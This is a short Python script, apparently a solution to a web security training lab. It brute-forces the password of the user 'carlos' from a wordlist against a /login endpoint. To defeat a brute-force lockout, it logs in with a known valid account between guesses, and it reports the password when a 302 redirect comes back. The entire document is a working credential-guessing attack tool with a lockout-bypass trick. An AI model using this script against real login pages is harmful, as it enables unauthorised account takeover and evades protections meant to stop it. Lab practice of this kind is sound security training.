import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

working_user = {'username' : 'wiener' , 'password' : 'peter'}
password_list = r"C:\Users\acalarco\Desktop\p\ptest\wordlist\passwords.txt"


def perform_request(url,username,password):
    uri = '/login'
    cookies = {'session' : '1FNjS3NqE8pCoLp6Pm5Le2DbHASKFHFN'}
    data = {'username' : username , 'password' : password}
    r = requests.post(url + uri, data=data, cookies=cookies, allow_redirects=False, verify=False, proxies=proxies)
    return r


def password_enumerator(url,password_list):
    username = 'carlos'
    i = 0
    with open(password_list) as p:
        passwords = p.readlines()
        for x in passwords:
            password = x.split("\n")[0]
            if (i % 2) == 0:
                perform_request(url,working_user['username'],working_user['password'])
            sys.stdout.write("[+] Testando la password %s\r" % password)
            sys.stdout.flush()
            response = perform_request(url,username,password)
            if response.status_code == 302:
                print("\n[+] La password è: %s" % password)
                return
            sys.stdout.write("\033[K")
            i += 1





if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()

    password_enumerator(url,password_list)